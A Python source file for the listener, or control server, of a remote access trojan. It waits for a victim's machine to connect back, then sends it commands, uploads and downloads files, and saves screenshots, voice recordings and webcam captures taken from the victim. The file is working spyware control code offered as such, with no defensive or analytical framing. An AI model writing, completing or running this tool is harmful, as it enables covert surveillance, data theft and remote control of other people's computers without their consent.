import socket,json,base64,getpass
import time
import cv2
import os
import subprocess
import threading
from multiprocessing import Process,Lock
from subprocess import Popen,PIPE
class Listener:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+]Waiting For Connection")
        self.connection,address=listener.accept()
        print("[+]Got a Connection from"+str(address))
    
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)
    def reliable_receive(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive()
    def write_file(self,path,content):
        
        with open(path,"wb") as file:
            content=content.encode("utf-8")
            file.write(base64.b64decode(content))
            return "[+]Download Successful"
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command=raw_input("[+]Command->>")
            command=command.split(" ")
            
            if command[0]=="upload":
                file_content=self.read_file(command[1])
                command.append(file_content)
            result=self.execute_remotely(command)
            if command[0]=="download":
                result=self.write_file(command[1],result)
            if command[0]=="screenshot":
                try:
                    os.chdir("Screenshots")
                except:
                    try:
                        os.chdir("../Screenshots")
                    except:
                        pass
                number=0
                
                
                output=subprocess.check_output("ls",shell=True)
                output=output.split("\n")
                
                for i in output:
                    if str(number) in i:
                        number+=1
                result=self.write_file(str(number)+".png",result)
                print("[+]Check Screenshots Folder Now!")
            if command[0]=="help":
                pass
            if command[0]=="voice_recorder" or command[0]=="voice_record":
                
                try:
                    os.chdir("Voice_Records")
                except:
                    try:
                        os.chdir("../Voice_Records")
                    except:
                        pass
                number=0
                output=subprocess.check_output("ls",shell=True)
                output=output.split("\n")
                for i in output:
                    if str(number) in i:
                        number+=1
                result=self.write_file(str(number)+".wav",result)
            if command[0]=="webcam_shot":
                try:
                    os.chdir("Webcamshots")
                except:
                    try:
                        os.chdir("../Webcamshots")
                    except:
                        pass
                number=0
                output=subprocess.check_output("ls",shell=True)
                output=output.split("\n")
                for i in output:
                    if str(number) in i:
                        number+=1
                result=self.write_file(str(number)+".png",result)
            print(result)


